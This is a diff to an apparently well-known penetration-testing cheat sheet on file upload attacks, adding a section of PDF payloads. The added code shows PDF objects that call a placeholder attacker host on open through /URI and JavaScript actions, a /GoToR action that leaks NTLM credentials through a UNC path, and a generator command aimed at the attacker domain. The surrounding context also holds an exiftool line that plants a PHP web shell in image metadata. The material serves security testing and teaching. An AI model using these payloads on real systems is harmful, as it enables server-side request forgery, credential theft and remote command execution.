@@ -11,6 +11,7 @@
     * [Filename Vulnerabilities](#filename-vulnerabilities)
     * [Picture Compression](#picture-compression)
     * [Picture Metadata](#picture-metadata)
+    * [PDF Payloads](#pdf-payloads)
     * [Configuration Files](#configuration-files)
     * [CVE - ImageMagick](#cve---imagemagick)
     * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)
@@ -21,6 +22,7 @@
 
 * [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool.
 * [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) -  HTTP file upload scanner for Burp Proxy.
+* [jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf) - Generate malicious PDF files to test callbacks, SSRF, XXE and NTLM leaks in PDF parsers.
 * [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) -  OWASP ZAP add-on for finding vulnerabilities in File Upload functionality.
 
 ## Methodology
@@ -198,6 +200,49 @@ Create a custom picture and insert exif tag with `exiftool`. A list of multiple 
 convert -size 110x110 xc:white payload.jpg
 exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+```
+
+### PDF Payloads
+
+Upload endpoints commonly accept PDF files and then parse them server-side with a converter, a thumbnail generator or a text extractor such as PDFBox, iText, PDF.js or Ghostscript. Several PDF features perform a network request or a file access when the document is opened, which turns the upload form into an SSRF, an NTLM credential leak or a blind callback.
+
+Request a URL when the document is opened, using an automatic `/URI` action.
+
+```ps1
+5 0 obj
+  << /Type /Action
+     /S /URI
+     /URI (http://[ATTACKER.DOMAIN.TLD]/callback)
+  >>
+endobj
+```
+
+Reach the same callback through the JavaScript engine with an `/OpenAction`.
+
+```ps1
+%PDF-1.7
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>>
+2 0 obj
+<</S /JavaScript /JS (
+this.getURL("http://[ATTACKER.DOMAIN.TLD]/callback")
+)>> trailer <</Root 1 0 R>>
+```
+
+Leak NTLM credentials from a Windows host by pointing a remote `/GoToR` action at a UNC path.
+
+```ps1
+<< /Type /Action
+   /S /GoToR
+   /F << /Type /FileSpec /F (\\\\10.10.10.10\\share\\test.pdf) /V true >>
+   /D [0 /Fit]
+>>
+```
+
+To generate a broader set of test files at once, covering these actions as well as XXE, XFA and FormCalc exfiltration variants, use [jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf) with a Burp Collaborator or interact.sh URL.
+
+```ps1
+python3 malicious-pdf.py http://[ATTACKER.DOMAIN.TLD]
 ```
 
 ### Configuration Files
@@ -404,10 +449,12 @@ More payloads in the folder `CVE FFmpeg HLS/`.
 * [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://web.archive.org/web/20180724174319/https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
 * [IIS - SOAP - Navigating The Shadows - 0xbad53c - May 19, 2024](https://web.archive.org/web/20220404084558/https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
 * [Injection points in popular image formats - Daniel Kalinowski‌‌ - November 8, 2019](https://web.archive.org/web/20191130061135/https://blog.isec.pl/injection-points-in-popular-image-formats/)
+* [Insecure features in PDFs - Vladislav Mladenov - January 17, 2021](https://web-in-security.blogspot.com/2021/01/insecure-features-in-pdfs.html)
 * [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](https://web.archive.org/web/20190125123231/http://corb3nik.github.io:80/blog/insomnihack-teaser-2019/l33t-hoster)
 * [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://web.archive.org/web/20260219153035/https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
 * [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February 23, 2014](https://web.archive.org/web/20140416083530/http://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
 * [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - August 21, 2018](https://web.archive.org/web/20180821130209/http://openwall.com/lists/oss-security/2018/08/21/2)
 * [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
+* [Portable Data exFiltration: XSS for PDFs - Gareth Heyes - December 10, 2020](https://portswigger.net/research/portable-data-exfiltration)
 * [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://web.archive.org/web/20200812181326/https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
 * [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://web.archive.org/web/20260218185252/https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
